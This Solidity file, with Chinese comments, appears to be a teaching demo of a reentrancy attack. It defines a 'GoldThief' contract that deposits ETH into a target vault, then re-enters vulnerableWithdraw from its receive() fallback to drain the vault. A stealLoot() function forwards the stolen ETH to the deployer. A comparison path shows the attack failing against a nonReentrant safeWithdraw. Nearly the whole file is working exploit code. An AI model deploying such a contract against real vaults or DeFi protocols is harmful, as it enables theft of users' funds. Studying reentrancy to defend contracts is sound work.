// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

//接口设置：可用函数及如何调用
interface IVault {
function deposit() external payable;
function vulnerableWithdraw() external;
function safeWithdraw() external;
}

contract GoldThief {
IVault public targetVault; //接口包装金库地址
address public owner;
uint public attackCount;   //记录重入循环的次数
bool public attackingSafe; //记录当前攻击的是vulnerableWithdraw()/safeWithdraw()

//部署时传入被攻击金库地址
constructor(address _vaultAddress) {
    targetVault = IVault(_vaultAddress);
    owner = msg.sender;
}

function attackVulnerable() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

    //针对易受攻击版本的攻击
    attackingSafe = false;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();//更新金库内部映射中的我们的余额
    targetVault.vulnerableWithdraw();       //调用金库的易受攻击提现函数
}

function attackSafe() external payable {
    require(msg.sender == owner, "Only owner");
    require(msg.value >= 1 ether, "Need at least 1 ETH");

    attackingSafe = true;
    attackCount = 0;

    targetVault.deposit{value: msg.value}();
    targetVault.safeWithdraw();             //调用金库的安全提现函数
}

receive() external payable {
    attackCount++; //统计攻击次数

    if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
        targetVault.vulnerableWithdraw();
    }

    if (attackingSafe) {
        targetVault.safeWithdraw(); // This will fail due to nonReentrant
    }
}

//盗来的的全部 ETH 从GoldThief 合约提现到部署者的私人钱包
function stealLoot() external {
    require(msg.sender == owner, "Only owner");
    payable(owner).transfer(address(this).balance);
}

//读取合约当前的ETH余额
function getBalance() external view returns (uint256) {
    return address(this).balance;
}
}